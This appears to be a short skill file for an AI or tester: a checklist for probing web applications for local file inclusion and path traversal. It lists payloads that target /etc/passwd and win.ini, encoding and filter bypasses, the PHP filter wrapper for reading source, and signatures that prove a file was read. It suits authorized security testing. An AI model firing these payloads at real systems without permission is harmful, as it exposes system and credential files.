---
name: lfi-traversal
description: Focused LFI/path-traversal checklist — absolute paths, encodings, wrappers, proof.
---

# LFI / Path Traversal

## Checklist
- [ ] Raw absolute path FIRST: `/etc/passwd`, `file:///etc/passwd` (often missed)
- [ ] Relative traversal depth 1–12
- [ ] Filter-stripping bypass: `....//....//etc/passwd`
- [ ] Encodings: `%2e%2e%2f`, double-encode, null byte on legacy, `?`/`#` suffix
- [ ] PHP wrappers: `php://filter/convert.base64-encode/resource=...`

## Common bypasses
- Leading-slash variants `//etc/passwd`, `/%2e/etc/passwd`
- Windows: `C:\windows\win.ini`, `..\..\`

## Proof standard
- Known file content signature (`root:x:0:0:` / `win.ini` keys). Generic 200 error page ≠ read.
- One blocked `../` payload ≠ negative until absolute/encoding/wrapper matrix tried.
